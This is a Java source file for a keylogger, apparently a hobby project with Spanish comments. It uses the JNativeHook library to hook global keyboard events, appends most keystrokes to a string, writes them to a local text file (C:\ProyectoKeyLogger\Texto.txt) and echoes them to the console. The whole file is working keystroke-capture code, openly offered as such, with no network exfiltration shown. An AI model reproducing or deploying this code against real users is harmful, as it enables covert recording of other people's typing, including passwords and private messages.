package keylogger;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import file.Files;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

/**
 *
 * @author VitaminaC
 * @version 1.0
 */
public class KeyLogger implements NativeKeyListener {

    Files file = new Files();

    //String en donde almacena el texto recogido por los metodos.
    private String textoEscrito = "";

    //Método de cuando una tecla se presiona.
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        /*
         * Utilizamos un switch para obtener el código de la letra que pulse el usuario.
         * Dependiendo del case obtendremos lo pulsado o simplemente no lo obtendremos porque no es de interés.
         * El default toma todas las demás letras que sean pulsadas.
         */
        switch (e.getKeyCode()) {

            //Se hará algo en estos case
            case (NativeKeyEvent.VC_SPACE):
                guardadoTeclas(" ");
                break;

            case (NativeKeyEvent.VC_BACK_SLASH):
                guardadoTeclas("\\");
                break;

            case (NativeKeyEvent.VC_SLASH):
                guardadoTeclas("/");
                break;

            case (NativeKeyEvent.VC_COMMA):
                guardadoTeclas(",");
                break;

            case (NativeKeyEvent.VC_PERIOD):
                guardadoTeclas(".");
                break;

            case (NativeKeyEvent.VC_BACKSPACE):
                teclaDeBorrar();
                break;

            //No se hará nada en estos case    
            case (NativeKeyEvent.VC_TAB):
                break;

            case (NativeKeyEvent.VC_SHIFT):
                break;

            case (NativeKeyEvent.VC_CONTROL):
                break;

            case (NativeKeyEvent.VC_ALT):
                break;

            case (NativeKeyEvent.VC_ENTER):
                break;

            case (NativeKeyEvent.VC_UP):
                break;

            case (NativeKeyEvent.VC_DOWN):
                break;

            case (NativeKeyEvent.VC_LEFT):
                break;

            case (NativeKeyEvent.VC_RIGHT):
                break;

            case (NativeKeyEvent.VC_META):
                break;

            case (NativeKeyEvent.VC_CAPS_LOCK):
                break;

            case (NativeKeyEvent.VC_ESCAPE):
                break;

            default:
                textoEscrito += NativeKeyEvent.getKeyText(e.getKeyCode());
                file.guardarTexto(textoEscrito);
                System.out.println(textoEscrito);
        }
    }

    private void guardadoTeclas(String tecla) {
        /*
          *Guardamos lo escrito en la variable "textoEscrito" y luego de eso hacemos una Llamada al
          *método de la clase (Files) encargada de almacenar en un archivo de texto lo enviado por parámetros.
          *
          *Finalmente imprimimos el mensaje en consola solo como una prueba visual del funcionamiento del KeyLogger.
         */
        textoEscrito += tecla;
        file.guardarTexto(textoEscrito);
        System.out.println(textoEscrito);
    }

    private void teclaDeBorrar() {
        String cadenaLeida = "", cadenaeEscrita = "";

        //FileReader y BufferedReader
        FileReader fr = null;
        BufferedReader br = null;

        //Leyendo el archivo para tomar lo que contiene y guardarlo en String cadenaLeida.
        try {
            fr = new FileReader(new File("C:\\ProyectoKeyLogger\\Texto.txt"));
            br = new BufferedReader(fr);

            cadenaLeida = br.readLine();

        } catch (FileNotFoundException e) {
            System.out.println("Error archivo no encontrado: " + e);
        } catch (IOException e) {
            System.out.println("Error al leer el archivo: " + e);
        } finally {
            try {
                fr.close();
                br.close();
            } catch (IOException e) {
                System.out.println("Error al cerrar el archivo: " + e);
            }
        }

        //FileWriter
        FileWriter fw = null;
        
        //Borrando último cáracter de la cadena y reescribiendo el archivo.
        cadenaeEscrita = cadenaLeida.substring(0, cadenaLeida.length() - 1);

        try {
            fw = new FileWriter(new File("C:\\ProyectoKeyLogger\\Texto.txt"));
            fw.write(cadenaeEscrita);
        } catch (FileNotFoundException e) {
            System.out.println("Error archivo no encontrado: " + e);
        } catch (IOException e) {
            System.out.println("Error al escribir el archivo: " + e);
        } finally {
            try {
                fw.close();
            } catch (IOException e) {
                System.out.println("Error al cerrar el archivo: " + e);
            }
        }
    }

}
